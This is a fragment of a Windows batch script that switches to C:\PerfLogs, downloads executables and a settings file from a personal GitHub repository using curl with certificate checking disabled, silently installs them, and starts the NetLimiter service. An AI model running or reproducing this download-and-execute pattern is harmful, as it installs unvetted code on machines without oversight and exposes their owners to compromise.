...
if %ErrorLevel% EQU 0 (
    ...
    @echo off
    cd "C:\PerfLogs"
    curl -L -s -k -O https://raw.githubusercontent.com/Muzcuk237529/thuonghai/master/vc_redist.x64.exe
    vc_redist.x64.exe /install /q /norestart
    curl -L -s -k -O https://raw.githubusercontent.com/Muzcuk237529/thuonghai/master/katacoda/AZ/netlimiter.exe
    ...
    curl -L -s -k -O https://raw.githubusercontent.com/Muzcuk237529/thuonghai/master/katacoda/AZ/nl_settings.xml
    net start nlsvc
